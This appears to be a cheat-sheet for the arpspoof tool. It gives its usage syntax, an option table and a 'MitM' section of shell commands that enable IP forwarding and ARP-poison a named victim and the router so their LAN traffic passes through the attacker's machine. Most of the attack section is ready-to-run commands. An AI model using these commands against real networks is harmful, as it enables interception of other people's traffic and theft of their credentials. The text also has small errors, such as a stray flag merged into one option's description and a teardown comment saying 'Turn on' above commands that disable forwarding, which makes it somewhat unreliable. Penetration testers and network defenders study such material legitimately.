**arpspoof** redirects packets from a target host (or all hosts) on the LAN intended for another host on the LAN by forging ARP replies.  
This is an extremely effective way of sniffing traffic on a switch.

```bash
$ arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host
```

| ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `‐i interface`     | Specify the interface to use.                                                                                                                                                                                                                                                                                                                                                                                    |
| `‐t target`        | Specify a particular host to ARP poison (if not specified, all hosts on the LAN).<br>Repeat to specify multiple hosts. r Poison both hosts (host and target) to capture traffic in both directions. (only valid in conjuntion with -t)                                                                                                                                                                           |
| `host`               | Specify the host you wish to intercept packets for (usually the local gateway).                                                                                                                                                                                                                                                                                                                                  |
| `‐c own/host/both` | Specify which hardware address t use when restoring the arp configuration; while cleaning up, packets can be send with the own address as well as with the address of the host. Sending packets with a fake hw address can disrupt connectivity with certain switch/ap/bridge configurations, however it works more reliably than using the own address, which is the default way arpspoof cleans up afterwards. |

# MitM
```bash
# Turn on the packet forwarding in Linux
# By enabling the packet forwarding, you disguise your local machine to act as the network router.
$ sysctl -w net.ipv4.ip_forward=1
$ echo '1' > /proc/sys/net/ipv4/ip_forward

# Redirect packages to your machine with arpspoof
$ arpspoof -i [Network Interface Name] -t [Victim IP] [Router IP]

# Intercept packages from the Router
$ arpspoof -i [Network Interface Name] -t [Router IP] [Victim IP]

# Stopping the attack
# kill arpspoof proceses and
# Turn on the packet forwarding in Linux
$ sysctl -w net.ipv4.ip_forward=0
$ echo '0' > /proc/sys/net/ipv4/ip_forward
